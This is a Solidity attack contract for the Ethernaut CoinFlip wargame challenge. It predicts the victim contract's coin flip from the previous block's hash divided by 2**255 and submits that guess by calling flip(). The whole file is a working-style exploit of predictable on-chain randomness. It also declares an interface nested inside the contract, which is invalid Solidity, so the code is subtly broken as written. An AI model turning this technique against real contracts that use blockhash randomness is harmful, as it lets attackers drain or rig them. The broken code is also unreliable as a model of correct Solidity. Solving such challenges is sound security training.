// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @title CoinFlipAttack
/// @notice Attack contract that predicts the outcome of the CoinFlip Ethernaut challenge
contract CoinFlipAttack {
    // The FACTOR used by the original CoinFlip contract to compute the coin flip from a blockhash.
    // In the Ethernaut CoinFlip challenge this is 2**255.
    uint256 private constant FACTOR = 2**255;

    /// @dev Minimal interface for the victim CoinFlip contract
    interface ICoinFlip {
        function flip(bool _guess) external returns (bool);
    }

    /**
     * @notice Performs an attack on a CoinFlip contract by predicting the outcome of a coin flip.
     *
     * @param _victim The address of the CoinFlip contract to attack.
     * @return side The predicted side of the coin flip (true or false).
     *
     * Steps:
     * 1. Create an instance of the CoinFlip contract using the provided victim address.
     * 2. Retrieve the blockhash of the previous block and convert it to a uint256 value.
     * 3. Calculate the coin flip outcome by dividing the block value by a predefined FACTOR.
     * 4. Determine the side of the coin flip (true or false) based on the calculated value.
     * 5. Call the `flip` function on the CoinFlip contract with the predicted side.
     * 6. Return the predicted side.
     */
    function attack(address _victim) public returns (bool) {
        ICoinFlip victim = ICoinFlip(_victim);

        // Get value derived from previous block's hash
        uint256 blockValue = uint256(blockhash(block.number - 1));

        // Compute coin flip: 0 or 1
        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        // Call the victim contract with the predicted side
        victim.flip(side);

        return side;
    }
}
